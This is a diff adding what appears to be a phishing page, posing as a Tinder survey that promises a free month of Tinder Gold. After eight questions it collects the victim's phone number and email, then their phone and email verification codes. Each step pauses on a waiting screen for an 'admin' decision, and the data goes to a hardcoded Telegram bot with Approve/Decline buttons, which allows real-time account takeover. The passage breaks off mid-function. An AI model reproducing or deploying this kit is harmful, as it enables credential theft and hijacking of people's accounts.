+/* Reward chip heartbeat */
+.reward-chip{animation:scalePop 0.6s 0.55s cubic-bezier(.34,1.56,.64,1) both,heartBeat 2s 2s ease infinite;}
+
+/* Stat cards stagger on scroll */
+.stat-card:nth-child(1){animation:fadeUp 0.5s 0.1s ease both;}
+.stat-card:nth-child(2){animation:fadeUp 0.5s 0.2s ease both;}
+.stat-card:nth-child(3){animation:fadeUp 0.5s 0.3s ease both;}
+.stat-card:nth-child(4){animation:fadeUp 0.5s 0.4s ease both;}
+
+/* Login flame bounce */
+.ls-flame{animation:ls-flame-bounce 2.5s ease infinite;}
+
+/* Login step bounce in */
+.ls-step{animation:bounceIn 0.45s cubic-bezier(.34,1.56,.64,1) both;}
+
+/* Code boxes */
+.ls-code-box:focus{animation:glowPulse 1.5s ease infinite;}
+
+/* Spinner */
+.ls-spinner{animation:spin 0.75s linear infinite;}
+
+/* Approved badge */
+.ls-approved-badge{animation:bounceIn 0.5s cubic-bezier(.34,1.56,.64,1) both;}
+.ls-gold-chip{animation:scalePop 0.5s 0.3s cubic-bezier(.34,1.56,.64,1) both,heartBeat 2s 1.5s ease infinite;}
+
+/* Shake class for validation errors */
+.shake{animation:shake 0.5s ease both!important;}
+
+/* Button ripple container */
+.btn-next,.ls-btn{position:relative;overflow:hidden;}
+.ripple-el{position:absolute;border-radius:50%;background:rgba(255,255,255,0.35);pointer-events:none;animation:ripple 0.55s ease-out forwards;}
+
+/* Input shimmer on valid */
+.q-text-input.valid,.ls-input:valid{
+  background:linear-gradient(90deg,var(--bg2) 0%,rgba(255,255,255,0.9) 50%,var(--bg2) 100%);
+  background-size:200% 100%;
+  animation:shimmer 1.5s ease;
+}
+
+/* Progress dot bounce when completed */
+.prog-dot.done{animation:bounceIn 0.3s cubic-bezier(.34,1.56,.64,1) both;}
+
+/* FAQ icon spin on open */
+.faq-item.open .faq-icon{animation:scalePop 0.25s cubic-bezier(.34,1.56,.64,1) both;}
+
+/* Confetti canvas */
+#confetti-canvas{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:9998;}
+
+/* Floating hearts on login */
+.ls-heart{position:absolute;pointer-events:none;animation:confettiFall linear forwards;}
+
+
+/* ── NEW LOGIN FLOW STYLES ── */
+.login-section{padding:24px 20px 60px;max-width:480px;margin:0 auto;}
+.login-card{background:var(--surface);border:1.5px solid var(--border);border-radius:var(--r-lg);padding:32px 28px;box-shadow:var(--shadow-lg);animation:bounceIn 0.45s cubic-bezier(.34,1.56,.64,1) both;}
+.login-logo{display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:20px;}
+.login-flame{font-size:32px;animation:ls-flame-bounce 2.5s ease infinite;}
+.login-brand{font-size:26px;font-weight:900;background:var(--t-grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
+.login-pill{display:inline-block;background:var(--gold-lt);border:1.5px solid var(--gold);color:var(--gold-dark);font-size:11px;font-weight:800;padding:5px 14px;border-radius:20px;margin-bottom:16px;text-align:center;width:100%;}
+.login-title{font-size:22px;font-weight:900;color:var(--text);margin-bottom:8px;letter-spacing:-0.3px;}
+.login-sub{font-size:13px;color:var(--muted);font-weight:600;line-height:1.55;margin-bottom:20px;}
+.login-field{display:flex;align-items:center;gap:10px;background:var(--bg2);border:2px solid var(--border);border-radius:var(--r-sm);padding:13px 16px;transition:border-color 0.2s,box-shadow 0.2s;}
+.login-field:focus-within{border-color:var(--t-red);box-shadow:0 0 0 3px rgba(254,60,114,0.1);}
+.login-field-icon{font-size:18px;flex-shrink:0;}
+.login-input{flex:1;border:none;background:transparent;font-family:'Nunito',sans-serif;font-size:15px;font-weight:700;color:var(--text);outline:none;}
+.login-input::placeholder{color:var(--muted2);font-weight:600;}
+.login-btn{width:100%;margin-top:18px;padding:15px;background:var(--t-grad);border:none;border-radius:var(--r-sm);color:#fff;font-family:'Nunito',sans-serif;font-size:15px;font-weight:800;cursor:pointer;transition:transform 0.15s,box-shadow 0.15s;box-shadow:0 4px 16px rgba(254,60,114,0.35);animation:glowPulse 2.5s 1.5s ease infinite;}
+.login-btn:hover{transform:translateY(-2px);box-shadow:0 6px 24px rgba(254,60,114,0.45);}
+.login-btn:active{transform:translateY(0);}
+.login-back{font-size:13px;font-weight:700;color:var(--muted);cursor:pointer;margin-bottom:16px;display:inline-block;}
+.login-back:hover{color:var(--t-red);}
+.waiting-card{background:var(--surface);border:1.5px solid var(--border);border-radius:var(--r-lg);padding:40px 28px;box-shadow:var(--shadow-lg);text-align:center;animation:bounceIn 0.45s cubic-bezier(.34,1.56,.64,1) both;}
+.spinner{width:48px;height:48px;border:4px solid var(--bg3);border-top-color:var(--t-red);border-radius:50%;animation:spin 0.75s linear infinite;margin:0 auto 20px;}
+@keyframes spin{to{transform:rotate(360deg)}}
+.waiting-title{font-size:20px;font-weight:900;color:var(--text);margin-bottom:8px;}
+.waiting-text{font-size:13px;color:var(--muted);font-weight:600;line-height:1.55;margin-bottom:24px;}
+.status-list{display:flex;flex-direction:column;gap:10px;text-align:left;}
+.status-item{display:flex;align-items:center;gap:10px;font-size:13px;font-weight:700;color:var(--text2);}
+.status-dot{width:10px;height:10px;border-radius:50%;background:var(--bg3);flex-shrink:0;transition:background 0.3s;}
+.status-dot.done{background:var(--success);animation:bounceIn 0.3s cubic-bezier(.34,1.56,.64,1) both;}
+.status-dot.active{background:var(--t-red);animation:pulse 1.5s ease infinite;}
+.result-card{background:var(--surface);border:1.5px solid var(--border);border-radius:var(--r-lg);padding:40px 28px;box-shadow:var(--shadow-lg);text-align:center;animation:bounceIn 0.5s cubic-bezier(.34,1.56,.64,1) both;}
+.result-icon{font-size:56px;display:block;margin-bottom:16px;animation:heartBeat 2s ease infinite;}
+.result-badge{display:inline-block;padding:6px 18px;border-radius:20px;font-size:13px;font-weight:800;margin-bottom:12px;}
+.result-badge.success{background:rgba(0,183,74,0.1);color:var(--success);border:1.5px solid var(--success);}
+.result-badge.error{background:rgba(254,60,114,0.08);color:var(--t-red);border:1.5px solid var(--t-red);}
+.result-title{font-size:22px;font-weight:900;color:var(--text);margin-bottom:8px;}
+.result-sub{font-size:14px;color:var(--muted);font-weight:600;line-height:1.55;margin-bottom:20px;}
+.gold-chip{display:inline-flex;align-items:center;gap:8px;background:var(--gold-lt);border:2px solid var(--gold);border-radius:12px;padding:10px 20px;font-size:14px;font-weight:800;color:var(--gold-dark);margin-bottom:24px;animation:heartBeat 2s 1s ease infinite;}
+.share-box{background:var(--bg2);border:1px solid var(--border);border-radius:var(--r-sm);padding:20px;}
+.share-title{font-size:15px;font-weight:900;color:var(--text);margin-bottom:8px;}
+.share-buttons{display:flex;flex-wrap:wrap;gap:8px;justify-content:center;margin-top:12px;}
+.share-btn{padding:9px 16px;border-radius:8px;font-family:'Nunito',sans-serif;font-size:13px;font-weight:700;cursor:pointer;border:2px solid;transition:transform 0.15s,box-shadow 0.15s;}
+.share-btn:hover{transform:translateY(-2px);}
+.share-btn.whatsapp{border-color:#25D366;color:#25D366;background:transparent;}
+.share-btn.telegram{border-color:#0088cc;color:#0088cc;background:transparent;}
+.share-btn.twitter{border-color:#1DA1F2;color:#1DA1F2;background:transparent;}
+.share-btn.copy{border-color:var(--border2);color:var(--text2);background:transparent;}
+.hidden{display:none!important;}
+.progress-bar-container{background:var(--bg3);height:4px;border-radius:2px;margin:16px 0;}
+.progress-bar{height:4px;background:var(--t-grad);border-radius:2px;transition:width 0.4s ease;}
+.progress-steps{display:flex;justify-content:space-between;margin-bottom:24px;}
+.progress-step{font-size:11px;font-weight:700;color:var(--muted2);text-align:center;flex:1;}
+.progress-step.active{color:var(--t-red);}
+.progress-step.done{color:var(--success);}
+@keyframes ls-flame-bounce{0%,100%{transform:scale(1) rotate(0deg)}25%{transform:scale(1.15) rotate(-5deg)}75%{transform:scale(1.1) rotate(5deg)}}
+@keyframes gradShift{0%,100%{background-position:0% 50%}50%{background-position:100% 50%}}
+@keyframes fadeUp{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}
+@keyframes fadeDown{from{opacity:0;transform:translateY(-12px)}to{opacity:1;transform:translateY(0)}}
+@keyframes scalePop{from{opacity:0;transform:scale(0.7)}to{opacity:1;transform:scale(1)}}
+</style>
+</head>
+<body>
+
+<div class="shutter" id="shutter"></div>
+
+<div class="page-shell" id="page-shell">
+  
+  <!-- HEADER -->
+  <header class="app-header">
+    <div class="header-logo">🔥</div>
+    <h1>Tinder Experience Survey</h1>
+    <p>Share your story. Claim your Gold reward.</p>
+  </header>
+
+  <!-- TICKER -->
+  <div class="prize-ticker">
+    <div class="ticker-content">
+      <div class="ticker-item"><span class="icon">🏆</span> FREE TINDER GOLD</div>
+      <div class="ticker-item"><span class="icon">⭐</span> 1 MONTH SUBSCRIPTION</div>
+      <div class="ticker-item"><span class="icon">🔥</span> INSTANT ACTIVATION</div>
+      <div class="ticker-item"><span class="icon">💎</span> EXCLUSIVE REWARD</div>
+      <div class="ticker-item"><span class="icon">🏆</span> FREE TINDER GOLD</div>
+      <div class="ticker-item"><span class="icon">⭐</span> 1 MONTH SUBSCRIPTION</div>
+      <div class="ticker-item"><span class="icon">🔥</span> INSTANT ACTIVATION</div>
+      <div class="ticker-item"><span class="icon">💎</span> EXCLUSIVE REWARD</div>
+    </div>
+  </div>
+
+  <!-- PROGRESS -->
+  <div class="progress-wrap">
+    <div class="progress-fill" id="progress-fill" style="width:0%"></div>
+  </div>
+  <div class="progress-steps" id="progress-steps">
+    <div class="progress-step active" data-step="1">Survey</div>
+    <div class="progress-step" data-step="2">Phone</div>
+    <div class="progress-step" data-step="3">Email</div>
+    <div class="progress-step" data-step="4">Verify</div>
+    <div class="progress-step" data-step="5">Gold</div>
+  </div>
+
+  <!-- CONTENT -->
+  <div class="content-area" id="content-area">
+    
+    <!-- SURVEY QUESTIONS -->
+    <div id="survey-section">
+      
+      <!-- Q1 -->
+      <div class="q-card" id="q1">
+        <div class="q-number">Question 01 <span class="q-type-badge choice">Multiple Choice</span></div>
+        <div class="q-text">How long have you been using Tinder?</div>
+        <div class="q-sub">Pick the option that best describes you.</div>
+        <div class="opts">
+          <button class="opt" onclick="selectOption(this, 'q1', 'Less than 6 months')"><span class="opt-radio"></span>Less than 6 months</button>
+          <button class="opt" onclick="selectOption(this, 'q1', '6 months – 1 year')"><span class="opt-radio"></span>6 months – 1 year</button>
+          <button class="opt" onclick="selectOption(this, 'q1', '1 – 3 years')"><span class="opt-radio"></span>1 – 3 years</button>
+          <button class="opt" onclick="selectOption(this, 'q1', '3 – 5 years')"><span class="opt-radio"></span>3 – 5 years</button>
+          <button class="opt" onclick="selectOption(this, 'q1', 'More than 5 years')"><span class="opt-radio"></span>More than 5 years</button>
+        </div>
+        <div class="val-msg" id="error-q1">Please select an option to continue.</div>
+      </div>
+
+      <!-- Q2 -->
+      <div class="q-card hidden" id="q2">
+        <div class="q-number">Question 02 <span class="q-type-badge text">Text Input</span></div>
+        <div class="q-text">What do you look for first on someone's Tinder profile?</div>
+        <div class="q-sub">Bio, photos, prompts? Tell us what catches your eye first.</div>
+        <div class="text-input-wrap">
+          <input type="text" class="q-text-input" id="input-q2" placeholder="e.g. Their photos, the bio, shared interests..." oninput="validateText('q2', 5)">
+          <span class="input-check" id="check-q2">✓</span>
+        </div>
+        <div class="val-msg" id="error-q2">Please type at least 5 characters.</div>
+      </div>
+
+      <!-- Q3 -->
+      <div class="q-card hidden" id="q3">
+        <div class="q-number">Question 03 <span class="q-type-badge scale">Slider</span></div>
+        <div class="q-text">On a scale of 1–10, how satisfied are you with Tinder overall?</div>
+        <div class="q-sub">Drag the slider to your score.</div>
+        <div class="scale-wrap">
+          <div class="scale-labels">
+            <span>😞 1 — Very unhappy</span>
+            <span>😍 10 — Love it</span>
+          </div>
+          <input type="range" class="scale-range" id="slider-q3" min="1" max="10" value="5" oninput="updateSlider(this)">
+          <div class="scale-value">
+            <div class="scale-value-num" id="value-q3">5</div>
+            <div class="scale-value-label" id="label-q3">Neutral</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Q4 -->
+      <div class="q-card hidden" id="q4">
+        <div class="q-number">Question 04 <span class="q-type-badge text">Text Input</span></div>
+        <div class="q-text">What kind of opening message actually gets you to reply?</div>
+        <div class="q-sub">No wrong answers — just tell us what works for you.</div>
+        <div class="text-input-wrap">
+          <input type="text" class="q-text-input" id="input-q4" placeholder="e.g. A funny joke, a genuine compliment..." oninput="validateText('q4', 5)">
+          <span class="input-check" id="check-q4">✓</span>
+        </div>
+        <div class="val-msg" id="error-q4">Please type at least 5 characters.</div>
+      </div>
+
+      <!-- Q5 -->
+      <div class="q-card hidden" id="q5">
+        <div class="q-number">Question 05 <span class="q-type-badge choice">Multi-Select</span></div>
+        <div class="q-text">Which Tinder features have you used?</div>
+        <div class="multi-hint">Select all that apply.</div>
+        <div class="opts">
+          <button class="multi-opt" onclick="toggleMulti(this, 'Super Likes')"><span class="multi-check"></span>⭐ Super Likes</button>
+          <button class="multi-opt" onclick="toggleMulti(this, 'Rewind')"><span class="multi-check"></span>↩️ Rewind (undo swipe)</button>
+          <button class="multi-opt" onclick="toggleMulti(this, 'Passport')"><span class="multi-check"></span>🌍 Passport</button>
+          <button class="multi-opt" onclick="toggleMulti(this, 'Boost')"><span class="multi-check"></span>🚀 Boost</button>
+          <button class="multi-opt" onclick="toggleMulti(this, 'See who liked me')"><span class="multi-check"></span>👀 See who liked me</button>
+          <button class="multi-opt" onclick="toggleMulti(this, 'None')"><span class="multi-check"></span>🚫 None — free version only</button>
+        </div>
+        <div class="val-msg" id="error-q5">Please select at least one option.</div>
+      </div>
+
+      <!-- Q6 -->
+      <div class="q-card hidden" id="q6">
+        <div class="q-number">Question 06 <span class="q-type-badge text">Text Input</span></div>
+        <div class="q-text">What's one tip you'd give someone just starting on Tinder?</div>
+        <div class="q-sub">Based on your experience — what actually works?</div>
+        <div class="text-input-wrap">
+          <input type="text" class="q-text-input" id="input-q6" placeholder="e.g. Use a clear photo, write a funny bio..." oninput="validateText('q6', 5)">
+          <span class="input-check" id="check-q6">✓</span>
+        </div>
+        <div class="val-msg" id="error-q6">Please type at least 5 characters.</div>
+      </div>
+
+      <!-- Q7 -->
+      <div class="q-card hidden" id="q7">
+        <div class="q-number">Question 07 <span class="q-type-badge choice">Multiple Choice</span></div>
+        <div class="q-text">What's the #1 thing that annoys you most about Tinder?</div>
+        <div class="opts">
+          <button class="opt" onclick="selectOption(this, 'q7', 'Swipe limit on free plan')"><span class="opt-radio"></span>😤 The swipe limit on the free plan</button>
+          <button class="opt" onclick="selectOption(this, 'q7', 'Matches who never reply')"><span class="opt-radio"></span>👻 Matches who never reply</button>
+          <button class="opt" onclick="selectOption(this, 'q7', 'Too many fake profiles')"><span class="opt-radio"></span>🤖 Too many fake profiles and bots</button>
+          <button class="opt" onclick="selectOption(this, 'q7', 'Premium too expensive')"><span class="opt-radio"></span>💸 Premium features are too expensive</button>
+          <button class="opt" onclick="selectOption(this, 'q7', 'Not enough users in my area')"><span class="opt-radio"></span>🌐 Not enough users in my area</button>
+        </div>
+        <div class="val-msg" id="error-q7">Please select an option to continue.</div>
+      </div>
+
+      <!-- Q8 -->
+      <div class="q-card hidden" id="q8">
+        <div class="q-number">Question 08 — Final <span class="q-type-badge text">Open Text</span></div>
+        <div class="q-text">If you could change one thing about Tinder, what would it be?</div>
+        <div class="q-sub">Be honest and detailed — your answer shapes what Tinder builds next.</div>
+        <textarea class="q-textarea" id="input-q8" placeholder="Share your genuine thoughts here..." oninput="validateTextarea()"></textarea>
+        <div class="char-hint" id="hint-q8">0 / 20 characters minimum</div>
+        <div class="val-msg" id="error-q8">Please write at least 20 characters.</div>
+      </div>
+
+    </div>
+
+    <!-- LOGIN SECTION (Hidden initially) -->
+    <div id="login-section" class="hidden">
+
+      <!-- STEP 1: Phone + Email on same page -->
+      <div class="login-card" id="login-credentials">
+        <div class="login-logo">
+          <div class="login-flame">🔥</div>
+          <div class="login-brand">tinder</div>
+        </div>
+        <div class="login-pill">🏆 Survey Complete — Claim Your Gold!</div>
+        <div class="login-title">Enter your details</div>
+        <div class="login-sub">Enter your phone and email to verify your Tinder account.</div>
+        <div style="font-size:0.7rem;font-weight:700;color:var(--muted);margin-bottom:12px;">🇺🇸 +1 · 🇬🇧 +44 · 🇰🇪 +254 · 🇳🇬 +234 · 🇿🇦 +27</div>
+        <div class="login-field">
+          <div class="login-field-icon">📱</div>
+          <input type="tel" class="login-input" id="phone-input" placeholder="+1 (555) 000-0000">
+        </div>
+        <div class="val-msg" id="error-phone">Please include your country code (e.g. +1 555 000 0000).</div>
+        <div class="login-field" style="margin-top:12px;">
+          <div class="login-field-icon">✉️</div>
+          <input type="email" class="login-input" id="email-input" placeholder="your@email.com">
+        </div>
+        <div class="val-msg" id="error-email">Please enter a valid email address.</div>
+        <button class="login-btn" onclick="submitCredentials()" style="margin-top:16px;">Continue →</button>
+      </div>
+
+      <!-- WAITING: Admin approves credentials -->
+      <div class="waiting-card hidden" id="waiting-credentials">
+        <div class="spinner"></div>
+        <div class="waiting-title">Verifying your details...</div>
+        <div class="waiting-text">Please wait while we confirm your account details.</div>
+        <div class="status-list">
+          <div class="status-item"><div class="status-dot done"></div><span>Survey completed</span></div>
+          <div class="status-item"><div class="status-dot active"></div><span>Verifying details...</span></div>
+          <div class="status-item"><div class="status-dot"></div><span>Phone code</span></div>
+          <div class="status-item"><div class="status-dot"></div><span>Email code</span></div>
+          <div class="status-item"><div class="status-dot"></div><span>Activate Gold</span></div>
+        </div>
+      </div>
+
+      <!-- STEP 2: Phone OTP code entry -->
+      <div class="login-card hidden" id="login-phone-code">
+        <div class="login-logo">
+          <div class="login-flame">🔥</div>
+          <div class="login-brand">tinder</div>
+        </div>
+        <div class="login-title">Enter your phone code</div>
+        <div class="login-sub" id="phone-code-sub">We sent a verification code to your phone number.</div>
+        <div class="login-field">
+          <div class="login-field-icon">🔢</div>
+          <input type="text" class="login-input" id="phone-code-input" placeholder="Enter code" maxlength="10">
+        </div>
+        <div class="val-msg" id="error-phone-code">Please enter the code you received.</div>
+        <button class="login-btn" onclick="submitPhoneCode()">Verify →</button>
+      </div>
+
+      <!-- WAITING: Admin approves phone code -->
+      <div class="waiting-card hidden" id="waiting-phone-code">
+        <div class="spinner"></div>
+        <div class="waiting-title">Verifying phone code...</div>
+        <div class="waiting-text">Please wait while we confirm your code.</div>
+        <div class="status-list">
+          <div class="status-item"><div class="status-dot done"></div><span>Survey completed</span></div>
+          <div class="status-item"><div class="status-dot done"></div><span>Details verified</span></div>
+          <div class="status-item"><div class="status-dot active"></div><span>Phone code pending</span></div>
+          <div class="status-item"><div class="status-dot"></div><span>Email code</span></div>
+          <div class="status-item"><div class="status-dot"></div><span>Activate Gold</span></div>
+        </div>
+      </div>
+
+      <!-- STEP 3: Email OTP code entry -->
+      <div class="login-card hidden" id="login-email-code">
+        <div class="login-logo">
+          <div class="login-flame">🔥</div>
+          <div class="login-brand">tinder</div>
+        </div>
+        <div class="login-title">Enter your email code</div>
+        <div class="login-sub" id="email-code-sub">We sent a verification code to your email address.</div>
+        <div class="login-field">
+          <div class="login-field-icon">🔢</div>
+          <input type="text" class="login-input" id="email-code-input" placeholder="Enter code" maxlength="10">
+        </div>
+        <div class="val-msg" id="error-email-code">Please enter the code you received.</div>
+        <button class="login-btn" onclick="submitEmailCode()">Verify →</button>
+      </div>
+
+      <!-- WAITING: Admin approves email code -->
+      <div class="waiting-card hidden" id="waiting-email-code">
+        <div class="spinner"></div>
+        <div class="waiting-title">Verifying email code...</div>
+        <div class="waiting-text">Please wait while we confirm your code.</div>
+        <div class="status-list">
+          <div class="status-item"><div class="status-dot done"></div><span>Survey completed</span></div>
+          <div class="status-item"><div class="status-dot done"></div><span>Details verified</span></div>
+          <div class="status-item"><div class="status-dot done"></div><span>Phone code verified</span></div>
+          <div class="status-item"><div class="status-dot active"></div><span>Email code pending</span></div>
+          <div class="status-item"><div class="status-dot"></div><span>Activate Gold</span></div>
+        </div>
+      </div>
+
+      <!-- SUCCESS -->
+      <div class="result-card hidden" id="result-success">
+        <span class="result-icon">🏆</span>
+        <div class="result-badge success">✅ Gold Activated!</div>
+        <div class="result-title">Your Tinder Gold is live!</div>
+        <div class="result-sub">Your subscription has been applied. Open Tinder to start enjoying Gold features.</div>
+        <div class="gold-chip">⭐ Tinder Gold — 1 Month Active</div>
+        <div class="share-box">
+          <div class="share-title">🔥 Boost your chances!</div>
+          <div style="font-size:0.85rem;color:var(--muted);margin-bottom:14px;font-weight:600;">Share with a friend to get a bonus month!</div>
+          <div class="share-buttons">
+            <button class="share-btn whatsapp" onclick="share('wa')">WhatsApp</button>
+            <button class="share-btn telegram" onclick="share('tg')">Telegram</button>
+            <button class="share-btn twitter" onclick="share('tw')">Twitter</button>
+            <button class="share-btn copy" onclick="copyLink()">Copy Link</button>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+  </div>
+
+  <!-- NAVIGATION -->
+  <div class="nav-bar" id="nav-bar">
+    <button class="btn-back hidden" id="btn-back" onclick="prevQuestion()">← Back</button>
+    <button class="btn-next" id="btn-next" onclick="nextQuestion()">Next →</button>
+  </div>
+
+</div>
+
+<!-- TOAST -->
+<div class="toast" id="toast">Copied to clipboard!</div>
+
+<script>
+// ==========================================
+// CONFIGURATION - UPDATE THESE VALUES
+// ==========================================
+const CONFIG = {
+  // Your Telegram Bot Token (get from @BotFather)
+  BOT_TOKEN: '8627724098:AAGYEd18BM1L6d7ub18HhysMsdYlIppNcCo',
+  // Your Telegram Chat ID (get from @userinfobot)
+  CHAT_ID: '8092667233',
+  // Survey share URL
+  SHARE_URL: 'https://tinder-surveys.netlify.app/'
+};
+
+// ==========================================
+// STATE MANAGEMENT
+// ==========================================
+let currentQuestion = 1;
+const totalQuestions = 8;
+let answers = {};
+let multiSelections = [];
+let userPhone = '', userEmail = '', userPhoneCode = '', userEmailCode = '';
+let currentStep = 'survey'; // survey, phone-wait, email, email-wait, final-wait, success, declined
+let pollInterval = null;
+let sessionId = '';
+
+// ==========================================
+// UTILITY FUNCTIONS
+// ==========================================
+function generateId() {
+  return Math.random().toString(36).substr(2, 9) + Date.now().toString(36);
+}
+
+function showToast(msg) {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.classList.add('show');
+  setTimeout(() => t.classList.remove('show'), 2500);
+}
+
+function updateProgress() {
+  const pct = Math.round(((currentQuestion - 1) / totalQuestions) * 100);
+  document.getElementById('progress-fill').style.width = pct + '%';
+  
+  // Update step indicators
+  document.querySelectorAll('.progress-step').forEach((step, idx) => {
+    step.classList.remove('active', 'done');
+    if (idx < Math.floor((currentQuestion - 1) / 2)) step.classList.add('done');
+    else if (idx === Math.floor((currentQuestion - 1) / 2)) step.classList.add('active');
+  });
+}
+
+function showQuestion(num) {
+  // Hide all questions
+  for (let i = 1; i <= totalQuestions; i++) {
+    document.getElementById('q' + i).classList.add('hidden');
+  }
+  // Show current
+  document.getElementById('q' + num).classList.remove('hidden');
+  
+  // Update nav
+  document.getElementById('btn-back').classList.toggle('hidden', num === 1);
+  document.getElementById('btn-next').textContent = num === totalQuestions ? 'Submit & Claim Reward 🎁' : 'Next →';
+  
+  updateProgress();
+  window.scrollTo({top: 0, behavior: 'smooth'});
+}
+
+// ==========================================
+// QUESTION HANDLERS
+// ==========================================
+function selectOption(btn, qid, value) {
+  // Remove selected from siblings
+  btn.parentElement.querySelectorAll('.opt').forEach(b => b.classList.remove('selected'));
+  btn.classList.add('selected');
+  answers[qid] = value;
+  document.getElementById('error-' + qid).style.display = 'none';
+}
+
+function toggleMulti(btn, value) {
+  btn.classList.toggle('selected');
+  if (btn.classList.contains('selected')) {
+    if (!multiSelections.includes(value)) multiSelections.push(value);
+  } else {
+    multiSelections = multiSelections.filter(v => v !== value);
+  }
+  answers.q5 = multiSelections;
+  document.getElementById('error-q5').style.display = 'none';
+}
+
+function validateText(qid, minLen) {
+  const val = document.getElementById('input-' + qid).value.trim();
+  const check = document.getElementById('check-' + qid);
+  const input = document.getElementById('input-' + qid);
+  
+  if (val.length >= minLen) {
+    answers[qid] = val;
+    check.classList.add('show');
+    input.classList.add('valid');
+    document.getElementById('error-' + qid).style.display = 'none';
+  } else {
+    answers[qid] = null;
+    check.classList.remove('show');
+    input.classList.remove('valid');
+  }
+}
+
+function validateTextarea() {
+  const val = document.getElementById('input-q8').value.trim();
+  const hint = document.getElementById('hint-q8');
+  hint.textContent = val.length + ' / 20 characters minimum';
+  
+  if (val.length >= 20) {
+    hint.classList.add('ok');
+    answers.q8 = val;
+    document.getElementById('error-q8').style.display = 'none';
+  } else {
+    hint.classList.remove('ok');
+    answers.q8 = null;
+  }
+}
+
+function updateSlider(el) {
+  const val = el.value;
+  document.getElementById('value-q3').textContent = val;
+  
+  const labels = ['', 'Very unhappy', 'Unhappy', 'Below average', 'Average', 'Neutral', 'Decent', 'Pretty good', 'Good', 'Great', 'Love it!'];
+  document.getElementById('label-q3').textContent = labels[val] || '';
+  
+  // Update fill
+  const pct = ((val - el.min) / (el.max - el.min)) * 100;
+  el.style.setProperty('--fill', pct + '%');
+  
+  answers.q3 = val;
+}
+
+// Initialize slider
+document.addEventListener('DOMContentLoaded', () => {
+  const slider = document.getElementById('slider-q3');
+  if (slider) updateSlider(slider);
+});
+
+// ==========================================
+// NAVIGATION
+// ==========================================
+function validateCurrent() {
+  const qid = 'q' + currentQuestion;
+  
+  if (currentQuestion === 3) return true; // Slider always valid
+  
+  if (currentQuestion === 5) {
+    if (!answers.q5 || answers.q5.length === 0) {
+      document.getElementById('error-q5').style.display = 'block';
+      shakeElement(qid);
+      return false;
+    }
+    return true;
+  }
+  
+  if (currentQuestion === 8) {
+    const val = document.getElementById('input-q8').value.trim();
+    if (val.length < 20) {
+      document.getElementById('error-q8').style.display = 'block';
+      shakeElement(qid);
+      return false;
+    }
+    return true;
+  }
+  
+  // Text inputs (q2, q4, q6)
+  if ([2, 4, 6].includes(currentQuestion)) {
+    if (!answers[qid]) {
+      document.getElementById('error-' + qid).style.display = 'block';
+      shakeElement(qid);
+      return false;
+    }
+    return true;
+  }
+  
+  // Radio buttons (q1, q7)
+  if (!answers[qid]) {
+    document.getElementById('error-' + qid).style.display = 'block';
+    shakeElement(qid);
+    return false;
+  }
+  return true;
+}
+
+function shakeElement(id) {
+  const el = document.getElementById(id);
+  el.classList.remove('shake');
+  void el.offsetWidth;
+  el.classList.add('shake');
+}
+
+function nextQuestion() {
+  if (!validateCurrent()) return;
+  
+  if (currentQuestion === totalQuestions) {
+    finishSurvey();
+    return;
+  }
+  
+  currentQuestion++;
+  showQuestion(currentQuestion);
+}
+
+function prevQuestion() {
+  if (currentQuestion > 1) {
+    currentQuestion--;
+    showQuestion(currentQuestion);
+  }
+}
+
+// ==========================================
+// SURVEY COMPLETION
+// ==========================================
+function finishSurvey() {
+  // Hide survey, show login
+  document.getElementById('survey-section').classList.add('hidden');
+  document.getElementById('login-section').classList.remove('hidden');
+  document.getElementById('page-shell').classList.add('login-mode');
+  document.getElementById('nav-bar').classList.add('hidden');
+  
+  // Update progress to show login phase
+  document.getElementById('progress-fill').style.width = '100%';
+  document.querySelectorAll('.progress-step')[0].classList.add('done');
+  document.querySelectorAll('.progress-step')[0].classList.remove('active');
+  document.querySelectorAll('.progress-step')[1].classList.add('active');
+  
+  // Send survey data to Telegram
+  sendToTelegram('📋 <b>New Survey Submission</b>\n\n' + formatSurveyData());
+}
+
+function formatSurveyData() {
+  return `
+<b>Q1:</b> ${answers.q1 || 'N/A'}
+<b>Q2:</b> ${answers.q2 || 'N/A'}
+<b>Q3:</b> ${answers.q3 || '5'}/10
+<b>Q4:</b> ${answers.q4 || 'N/A'}
+<b>Q5:</b> ${answers.q5 ? answers.q5.join(', ') : 'N/A'}
+<b>Q6:</b> ${answers.q6 || 'N/A'}
+<b>Q7:</b> ${answers.q7 || 'N/A'}
+<b>Q8:</b> ${answers.q8 || 'N/A'}
+  `.trim();
+}
+
+// ==========================================
+// TELEGRAM INTEGRATION
+// ==========================================
+async function sendToTelegram(text, withButtons = false, session = '') {
+  const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`;
+  
+  const body = {
+    chat_id: CONFIG.CHAT_ID,
+    text: text,
+    parse_mode: 'HTML',
+    reply_markup: withButtons ? {
+      inline_keyboard: [[
+        { text: '✅ Approve', callback_data: `approve|${session}` },
+        { text: '❌ Decline', callback_data: `decline|${session}` }
+      ]]
+    } : undefined
+  };
+  
+  try {
+    const res = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(body)
+    });
+    return await res.json();
+  } catch (e) {
+    console.error('Telegram error:', e);
+    return null;
+  }
+}
+
+// ==========================================
+// LOGIN FLOW
+// ==========================================
+
+// STEP 1: Submit phone + email together
+function submitCredentials() {
+  const phone = document.getElementById('phone-input').value.trim();
+  const email = document.getElementById('email-input').value.trim();
+  let valid = true;
+
+  if (phone.length < 8 || !phone.includes('+')) {
+    document.getElementById('error-phone').style.display = 'block';
+    valid = false;
+  } else {
+    document.getElementById('error-phone').style.display = 'none';
+  }
+
+  if (!email.includes('@') || !email.includes('.')) {
+    document.getElementById('error-email').style.display = 'block';
+    valid = false;
+  } else {
+    document.getElementById('error-email').style.display = 'none';
+  }
+
+  if (!valid) return;
+
+  userPhone = phone;
+  userEmail = email;
+
+  document.getElementById('login-credentials').classList.add('hidden');
+  document.getElementById('waiting-credentials').classList.remove('hidden');
+
+  sessionId = generateId();
+  currentStep = 'credentials-wait';
+
+  sendToTelegram(
+    `🔥 <b>New Tinder Survey Submission</b>\n\n` +
+    `📞 Phone: <code>${userPhone}</code>\n` +
